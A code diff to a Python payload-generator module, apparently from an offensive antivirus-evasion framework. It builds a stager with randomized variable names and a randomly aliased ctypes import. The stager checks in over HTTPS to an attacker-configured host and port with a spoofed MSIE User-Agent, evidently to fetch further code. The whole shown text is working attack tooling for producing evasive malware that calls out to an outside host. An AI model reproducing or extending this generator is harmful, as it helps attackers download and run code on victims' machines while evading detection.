@@ -47,8 +47,6 @@ class PayloadModule:
 
     def generate(self):
 
-        payload_code = "import urllib.request, string, random, struct, ctypes, time, ssl\n"
-
         # randomize everything, yo'
         sumMethodName = evasion_helpers.randomString()
         checkinMethodName = evasion_helpers.randomString()
@@ -77,7 +75,8 @@ class PayloadModule:
         # How I'm tracking the number of nested tabs needed
         # to make the payload
         num_tabs_required = 0
-        payload_code = ''
+        payload_code = "import urllib.request, string, random, struct, time, ssl, ctypes as " + randctypes + "\n"
+
 
         if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
 
@@ -157,7 +156,7 @@ class PayloadModule:
         payload_code += "\t" + proxy_var + " = urllib.request.ProxyHandler({})\n"
         payload_code += "\t" + opener_var + " = urllib.request.build_opener(" + proxy_var + ")\n"
         payload_code += "\turllib.request.install_opener(" + opener_var + ")\n"
-        payload_code += "\t%s = urllib.request.Request(\"https://%%s:%%s/%%s\" %%(%s,%s,%s()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n" %(requestName, hostName, portName, checkinMethodName)
+        payload_code += '\t' * num_tabs_required + "\t" + requestName + " = urllib.request.Request(\"https://\" + " + hostName + " + \":\" + str(" + portName + ") + \"/\" + " + checkinMethodName + "(), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
         payload_code += "\ttry:\n"
         payload_code += "\t\t%s = urllib.request.urlopen(%s)\n" %(tName, requestName)
         payload_code += "\t\ttry:\n"
